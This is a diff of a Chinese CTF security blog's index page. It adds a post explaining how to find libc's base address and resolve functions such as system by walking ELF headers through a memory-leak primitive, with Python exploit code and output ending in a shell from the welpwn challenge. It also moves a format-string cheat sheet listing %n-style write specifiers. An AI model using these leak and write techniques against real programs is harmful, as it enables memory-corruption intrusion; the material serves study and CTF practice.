@@ -298,6 +298,156 @@
             
               
                 
+                <a class="post-title-link" href="/2016/09/09/find_function/" itemprop="url">
+                  泄漏ELF共享对象基址重置后内部函数的地址
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-09T00:00:00+08:00" content="2016-09-09">
+              2016-09-09
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Articles/" itemprop="url" rel="index">
+                    <span itemprop="name">Articles</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/09/find_function/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/09/find_function/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="前言">前言</h1><p>前几天写<a href="http://0byjwzsf.me/2016/09/05/rctf-qual-2015-welpwn/">rctf-qual-2015-welpwn</a>的时候用了<strong><em>DynELF</em></strong>模块。那时不用<strong><em>libc-database</em></strong>的原因是担心有时libc会找不到。</p>
+<p>用<strong><em>DynELF</em></strong>写exploit的时候遇到了不少麻烦（最终解决了），所以还是希望能理解一下<strong><em>DynELF</em></strong>寻找函数加载地址的原理，恰好前几天看到了一篇这篇文章<a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" target="_blank" rel="external">[1]</a>，理解了原理后，今天自己动手尝试了一下，顺便记录。</p>
+<h1 id="正文">正文</h1><h2 id="0x0_说明">0x0 说明</h2><blockquote>
+<p>以x86-64为例<br>以寻找libc中函数为例</p>
+</blockquote>
+<h2 id="0x1_寻找ELF文件动态加载的基址">0x1 寻找ELF文件动态加载的基址</h2><p>首先看一下<a href="https://github.com/bminor/glibc/blob/master/elf/elf.h#L87" target="_blank" rel="external">ELF文件头</a>，文件头的第一个成员就是魔数(Magic)，其开头为<code>&quot;\x7fELF&quot;</code>，我们可以根据它来确定ELF加载的基址。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>	e_ident[EI_NIDENT];	<span class="comment">/* Magic number and other info */</span></span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure>
+<p>在寻找加载后基址前，我们首先要泄露出这个ELF文件加载入内存后其中的某个函数的地址。这个地址容易泄露，只要泄露<code>GOT表</code>中某个已经调用过的函数即可，这里我们选取<code>write</code>函数(0x7f048c08e860)</p>
+<p>然后舍弃泄露出来的地址的最后12位（ELF文件加载地址是页对齐的），得到<code>0x7f048c08e000</code>，对这个地址不断减0x1000，然后泄露其开始的4个字节，直到于Magic的头4个字节匹配为止。即可得到ELF文件加载的基址(0x7f048bfa3000)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get arbitrary address located in libc</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_elf_entry</span><span class="params">(got)</span>:</span></span><br><span class="line">    entry = l64(leak(got, <span class="number">0x8</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] libc entry\t\t\t\t:\t0x%x'</span> % entry</span><br><span class="line">    <span class="keyword">return</span> entry</span><br><span class="line"></span><br><span class="line"><span class="comment"># find libc base according to Magic</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_elf_base</span><span class="params">(entry)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        libc_base = entry &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            garbage = leak(libc_base, <span class="number">0x4</span>)</span><br><span class="line">            <span class="keyword">if</span> garbage == <span class="string">'\x7fELF'</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            libc_base -= <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] libc base\t\t\t\t:\t0x%x'</span> % libc_base</span><br><span class="line">        <span class="keyword">return</span> libc_base</span><br></pre></td></tr></table></figure>
+<h2 id="0x02_寻找DYNAMIC段">0x02 寻找<em>DYNAMIC</em>段</h2><p><em>DYNAMIC</em>段中存储着<code>.dynamic</code>section，它与动态链接有关的section，我们需要找到它的位置</p>
+<p>首先要找程序头表(Promgram Header Table)，再看一下<a href="https://github.com/bminor/glibc/blob/master/elf/elf.h#L92" target="_blank" rel="external">ELF文件头</a><code>e_phoff</code>成员存储该ELF文件载入内存后的程序头表在虚拟内存中的相对地址，其<code>绝对地址 = elf_base + 相对地址</code>（elf_base为ELF文件的基址，在上面已求得），易求得，libc程序头表绝对地址为<code>0x7f048bfa3000 + 0x40 = 0x7f048bfa3040</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  Elf64_Off	e_phoff;		<span class="comment">/* Program header table file offset */</span></span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure>
+<p>解释一下程序头表的结构，它是一个结构体数组，每一个结构体是一个<code>segment header</code>，<a href="https://github.com/bminor/glibc/blob/master/elf/elf.h#L690" target="_blank" rel="external">结构体</a>定义如下，我们需要了解的就是<code>p_type</code>和<code>p_vaddr</code>成员，<code>p_type</code>代表segment的类型，<code>p_vaddr</code>存储的是该段的虚拟地址</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  Elf64_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>
+<p>我们要找的<em>DYNAMIC</em>段的<code>p_type</code>为0x2，根据这个就可以找到<em>DYNAMIC</em>段的<code>segment header</code>，然后查询该头的<code>p_vaddr</code>成员，，由于我机器上的libc为PIC(通过<code>readelf -d libc.so | grep TEXTREL</code>可判断是否为PIC），该虚拟地址代表的是相对虚拟地址，实际虚拟地址还需要加上<code>libc_base</code>，易求得为<code>0x7f048c360ba0</code></p>
+<p>由此，我们已经得到了<em>DYNAMIC</em>段的虚拟地址，通过<code>readelf</code>容易看到，这个segment中只有<code>.dynamic</code>这一个section被映射进来，因此<br>我们得到的这个地址也是<code>.dynamic</code>映射进来后的虚拟地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find program header table</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_phdr</span><span class="params">(elf_base)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="comment"># get address of program header table</span></span><br><span class="line">        phdr = l64(leak(elf_base + <span class="number">0x20</span>, <span class="number">0x8</span>)) + elf_base</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] program headers table\t\t:\t0x%x'</span> % phdr</span><br><span class="line">        <span class="keyword">return</span> phdr</span><br><span class="line"></span><br><span class="line"><span class="comment"># find dynamic section table (.dynamic section -&gt; DYNAMIC segment)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_dyn_section</span><span class="params">(phdr, elf_base)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        phdr_ent = phdr</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            garbage = l32(leak(phdr_ent, <span class="number">0x4</span>))</span><br><span class="line">            <span class="comment"># p_type of dynamic segment is 0x2</span></span><br><span class="line">            <span class="keyword">if</span> garbage == <span class="number">0x2</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            phdr_ent += <span class="number">0x38</span></span><br><span class="line">        dyn_section = l64(leak(phdr_ent + <span class="number">0x10</span>, <span class="number">0x8</span>)) + elf_base</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] .dynamic section headers table\t:\t0x%x'</span> % dyn_section</span><br><span class="line">        <span class="keyword">return</span> dyn_section</span><br></pre></td></tr></table></figure>
+<h2 id="0x03_寻找动态链接符号表(-dynsym)和动态链接字符串表(-dynstr)">0x03 寻找<em>动态链接符号表</em>(.dynsym)和<em>动态链接字符串表</em>(.dynstr)</h2><p><code>.dynamic</code>段也是一个结构体数组，<a href="https://github.com/bminor/glibc/blob/master/elf/elf.h#L800" target="_blank" rel="external">结构体</a>的定义如下，它含有与动态链接有关的section的信息，其中<code>d_tag</code>成员代表不同的section，后面的<code>d_un</code>联合体用来代表大小或者是地址</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
+<p>我们要找的<em>动态链接符合表</em>(DT_SYMTAB)和<em>动态链接字符串表</em>(DT_STRTAB)的<code>d_tag</code>值分别为0x6和0x5，其分别对应的<code>d_un</code>值即为相对应的虚拟地址(0x7f048c360ba0和0x7f048bfa6d28)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_sym_str_table</span><span class="params">(dyn_section)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        dyn_ent = dyn_section</span><br><span class="line">        dt_sym_tab = <span class="number">0x0</span></span><br><span class="line">        dt_str_tab = <span class="number">0x0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            garbage = l64(leak(dyn_ent, <span class="number">0x8</span>))</span><br><span class="line">            <span class="keyword">if</span> garbage == <span class="number">0x6</span>:</span><br><span class="line">                dt_sym_tab = l64(leak(dyn_ent + <span class="number">0x8</span>, <span class="number">0x8</span>))</span><br><span class="line">            <span class="keyword">elif</span> garbage == <span class="number">0x5</span>:</span><br><span class="line">                dt_str_tab = l64(leak(dyn_ent + <span class="number">0x8</span>, <span class="number">0x8</span>))</span><br><span class="line">            <span class="keyword">if</span> dt_str_tab <span class="keyword">and</span> dt_sym_tab:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            dyn_ent += <span class="number">0x10</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] symtab\t\t\t\t:\t0x%x'</span> % dt_sym_tab</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] strtab\t\t\t\t:\t0x%x'</span> % dt_str_tab</span><br><span class="line">        <span class="keyword">return</span> (dt_sym_tab, dt_str_tab)</span><br></pre></td></tr></table></figure>
+<h2 id="0x04">0x04</h2><p>至此，我们已经找到了<code>.dynsym</code>和<code>.dynstr</code>，再解释一下<code>.dynsym</code>的结构，他是一个结构体数组，每个<a href="https://github.com/bminor/glibc/blob/master/elf/elf.h#L528" target="_blank" rel="external">结构体</a>定义如下，其中<code>st_name</code>的值，为该符号所对应的符合名字符串在<code>.dynstr</code>中的偏移，<code>st_value</code>为该符号的相对地址，该相对地址加上<code>libc_base</code>即为该符号对应的实际地址</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
+<p>因此我们要做的就是遍历<code>.dynsym</code>表，然后在<code>.dynstr</code>中查找对应字符串，与我们的目标函数名字符串进行对比，直到匹配为止，就此得到我们的目标函数在符号表内的位置，其<code>st_value</code>值加上<code>libc_base</code>就得到了函数的地址了！</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_func_adr</span><span class="params">(dt_sym_tab, dt_str_tab, func, elf_base)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        sym_ent = dt_sym_tab</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            garbage = l32(leak(sym_ent, <span class="number">0x4</span>))</span><br><span class="line">            name    = leak(dt_str_tab + garbage, len(func))</span><br><span class="line">            <span class="keyword">if</span> name == func:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sym_ent += <span class="number">0x18</span></span><br><span class="line">        adr_func = l64(leak(sym_ent + <span class="number">0x8</span>, <span class="number">0x8</span>)) + elf_base</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] %s loaded address\t:\t0x%x'</span> % (func, adr_func)</span><br><span class="line">        <span class="keyword">return</span> adr_func</span><br></pre></td></tr></table></figure>
+<h1 id="代码">代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># manual leak libc</span></span><br><span class="line">BITS = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get arbitrary address located in libc</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_elf_entry</span><span class="params">(got)</span>:</span></span><br><span class="line">    entry = l64(leak(got, <span class="number">0x8</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] libc entry\t\t\t\t:\t0x%x'</span> % entry</span><br><span class="line">    <span class="keyword">return</span> entry</span><br><span class="line"></span><br><span class="line"><span class="comment"># find libc base according to Magic</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_elf_base</span><span class="params">(entry)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        libc_base = entry &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            garbage = leak(libc_base, <span class="number">0x4</span>)</span><br><span class="line">            <span class="keyword">if</span> garbage == <span class="string">'\x7fELF'</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            libc_base -= <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] libc base\t\t\t\t:\t0x%x'</span> % libc_base</span><br><span class="line">        <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># find program header table</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_phdr</span><span class="params">(elf_base)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="comment"># get address of program header table</span></span><br><span class="line">        phdr = l64(leak(elf_base + <span class="number">0x20</span>, <span class="number">0x8</span>)) + elf_base</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] program headers table\t\t:\t0x%x'</span> % phdr</span><br><span class="line">        <span class="keyword">return</span> phdr</span><br><span class="line"></span><br><span class="line"><span class="comment"># find dynamic section table (.dynamic section -&gt; DYNAMIC segment)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_dyn_section</span><span class="params">(phdr, elf_base)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        phdr_ent = phdr</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            garbage = l32(leak(phdr_ent, <span class="number">0x4</span>))</span><br><span class="line">            <span class="comment"># p_type of dynamic segment is 0x2</span></span><br><span class="line">            <span class="keyword">if</span> garbage == <span class="number">0x2</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            phdr_ent += <span class="number">0x38</span></span><br><span class="line">        dyn_section = l64(leak(phdr_ent + <span class="number">0x10</span>, <span class="number">0x8</span>)) + elf_base</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] .dynamic section headers table\t:\t0x%x'</span> % dyn_section</span><br><span class="line">        <span class="keyword">return</span> dyn_section</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_sym_str_table</span><span class="params">(dyn_section)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        dyn_ent = dyn_section</span><br><span class="line">        dt_sym_tab = <span class="number">0x0</span></span><br><span class="line">        dt_str_tab = <span class="number">0x0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            garbage = l64(leak(dyn_ent, <span class="number">0x8</span>))</span><br><span class="line">            <span class="keyword">if</span> garbage == <span class="number">0x6</span>:</span><br><span class="line">                dt_sym_tab = l64(leak(dyn_ent + <span class="number">0x8</span>, <span class="number">0x8</span>))</span><br><span class="line">            <span class="keyword">elif</span> garbage == <span class="number">0x5</span>:</span><br><span class="line">                dt_str_tab = l64(leak(dyn_ent + <span class="number">0x8</span>, <span class="number">0x8</span>))</span><br><span class="line">            <span class="keyword">if</span> dt_str_tab <span class="keyword">and</span> dt_sym_tab:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            dyn_ent += <span class="number">0x10</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] symtab\t\t\t\t:\t0x%x'</span> % dt_sym_tab</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] strtab\t\t\t\t:\t0x%x'</span> % dt_str_tab</span><br><span class="line">        <span class="keyword">return</span> (dt_sym_tab, dt_str_tab)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_func_adr</span><span class="params">(dt_sym_tab, dt_str_tab, func, elf_base)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> BITS == <span class="number">64</span>:</span><br><span class="line">        sym_ent = dt_sym_tab</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            garbage = l32(leak(sym_ent, <span class="number">0x4</span>))</span><br><span class="line">            name    = leak(dt_str_tab + garbage, len(func))</span><br><span class="line">            <span class="keyword">if</span> name == func:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sym_ent += <span class="number">0x18</span></span><br><span class="line">        adr_func = l64(leak(sym_ent + <span class="number">0x8</span>, <span class="number">0x8</span>)) + elf_base</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] %s loaded address\t:\t0x%x'</span> % (func, adr_func)</span><br><span class="line">        <span class="keyword">return</span> adr_func</span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit ELF</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lookup</span><span class="params">(func)</span>:</span></span><br><span class="line">    entry                   = get_elf_entry(got_write)</span><br><span class="line">    elf_base                = find_elf_base(entry)</span><br><span class="line">    phdr                    = find_phdr(elf_base)</span><br><span class="line">    dyn_section             = find_dyn_section(phdr, elf_base)</span><br><span class="line">    dt_sym_tab, dt_str_tab  = find_sym_str_table(dyn_section)</span><br><span class="line">    func_address            = find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base)</span><br><span class="line">    <span class="keyword">return</span> func_address</span><br></pre></td></tr></table></figure>
+<h2 id="get_shell">get shell</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ctf:...-<span class="number">2015</span>/rctf-qual-<span class="number">2015</span>-welpwn&gt; python exp_manu.py                                                       (master✱)</span><br><span class="line">[+] libc entry				        :	<span class="number">0x7f048c08e860</span></span><br><span class="line">[+] libc base				        :	<span class="number">0x7f048bfa3000</span></span><br><span class="line">[+] program headers table		    :	<span class="number">0x7f048bfa3040</span></span><br><span class="line">[+] .dynamic section headers table	:	<span class="number">0x7f048c360ba0</span></span><br><span class="line">[+] symtab				            :	<span class="number">0x7f048bfa6d28</span></span><br><span class="line">[+] strtab				            :	<span class="number">0x7f048bfb3d78</span></span><br><span class="line">[+] __libc_system loaded address	:	<span class="number">0x7f048bfe9640</span></span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(ctf) gid=<span class="number">999</span>(admin) groups=<span class="number">999</span>(admin)</span><br></pre></td></tr></table></figure>
+<h1 id="Reference">Reference</h1><ol>
+<li><a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" target="_blank" rel="external">http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html</a></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/09/08/bctf-qual-2016-bcloud/" itemprop="url">
                   bctf-qual-2016-bcloud
                 </a>
@@ -563,145 +713,6 @@
             
               
                 
-                <a class="post-title-link" href="/2016/09/07/fsb-sum-up/" itemprop="url">
-                  格式化字符串漏洞总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-09-07T00:00:00+08:00" content="2016-09-07">
-              2016-09-07
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/09/07/fsb-sum-up/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/07/fsb-sum-up/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>因为碰到了挺多fsb的题目，然后每次居然都会忘记一部分格式，所以还是记录一下好了。</p>
-<h1 id="0x1_使用">0x1 使用</h1><p>注：这里仅以<code>printf</code>函数为例</p>
-<h2 id="32位">32位</h2><h3 id="读">读</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$x'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 读4个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$p'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 同上面</span></span><br><span class="line"><span class="string">'$&#123;&#125;$s'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="写">写</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$n'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 解引用，写入四个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>          <span class="comment">// 解引用，写入两个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hhn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入一个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lln'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入八个字节</span></span><br></pre></td></tr></table></figure>
-<h2 id="64位">64位</h2><h3 id="读-1">读</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$x'</span>.<span class="function"><span class="title">format</span><span class="params">(index, num)</span></span>      <span class="comment">// 读4个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lx'</span>.<span class="function"><span class="title">format</span><span class="params">(index, num)</span></span>     <span class="comment">// 读8个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$p'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 读8个字节</span></span><br><span class="line"><span class="string">'$&#123;&#125;$s'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="写-1">写</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">'%&#123;&#125;$n'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>           <span class="comment">// 解引用，写入四个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>          <span class="comment">// 解引用，写入两个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$hhn'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入一个字节</span></span><br><span class="line"><span class="string">'%&#123;&#125;$lln'</span>.<span class="function"><span class="title">format</span><span class="params">(index)</span></span>         <span class="comment">// 解引用，写入八个字节</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>%1$lx</code>: RSI</li>
-<li><code>%2$lx</code>: RDX</li>
-<li><code>%3$lx</code>: RCX</li>
-<li><code>%4$lx</code>: R8</li>
-<li><code>%5$lx</code>: R9</li>
-<li><code>%6$lx</code>: 栈上的第一个QWORD</li>
-</ul>
-<h1 id="0x2_技巧">0x2 技巧</h1><ol>
-<li>可以泄露栈的地址</li>
-<li>泄露__libc_start_main基址 （在堆利用中遇到过一次，alictf-qual-2016-fb）</li>
-<li>泄露canary</li>
-<li>利用相邻ebp之间的引用关系，实现理论上的任意地址读写 (参考pwnable.kr-fsb 和 rctf-qual-2015-nobug，其实感觉不太好用，需要连着两次的fsb才行)</li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
                 <a class="post-title-link" href="/2016/09/07/rctf-qual-2015-nobug/" itemprop="url">
                   rctf-qual-2015-nobug
                 </a>
@@ -839,8 +850,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/09/05/rctf-qual-2015-welpwn/" itemprop="url">
-                  rctf-qual-2015-welpwn
+                <a class="post-title-link" href="/2016/09/07/fsb-sum-up/" itemprop="url">
+                  格式化字符串漏洞总结
                 </a>
               
             
@@ -853,8 +864,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-09-05T00:00:00+08:00" content="2016-09-05">
-              2016-09-05
+            <time itemprop="dateCreated" datetime="2016-09-07T00:00:00+08:00" content="2016-09-07">
+              2016-09-07
             </time>
           </span>
 
@@ -867,8 +878,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
                   </a>
                 </span>
 
@@ -883,8 +894,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/09/05/rctf-qual-2015-welpwn/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/05/rctf-qual-2015-welpwn/" itemprop="commentsCount"></span>
+                <a href="/2016/09/07/fsb-sum-up/#comments" itemprop="discussionUrl">
